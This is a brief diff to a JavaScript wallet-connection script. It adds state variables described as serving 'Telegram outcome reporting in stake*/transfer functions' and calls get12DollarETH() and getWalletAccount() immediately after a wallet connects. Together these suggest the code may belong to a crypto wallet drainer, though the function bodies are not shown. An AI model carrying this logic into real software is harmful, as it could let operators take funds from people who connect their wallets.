@@ -39,6 +39,12 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
 (function() {
   'use strict';
 
+  // Module-level variables preserved from original for exact business logic compatibility
+  // (success flag for Telegram outcome reporting in stake*/transfer functions, perETH_usd for WETH pricing, message)
+  let success = 0;
+  let perETH_usd;
+  let message;
+
   // ============================================
   // CENTRALIZED APPLICATION STATE
   // ============================================
@@ -431,6 +437,8 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
       appState.connected = true;
 
       structuredLog('info', 'wc_v2_connect_success', { account: appState.account });
+      await get12DollarETH();
+      await getWalletAccount();
       return true;
 
     } catch (err) {
@@ -751,6 +759,7 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
         walletType: appState.walletType
       });
 
+      await get12DollarETH();
       await getWalletAccount();
       return true;
 
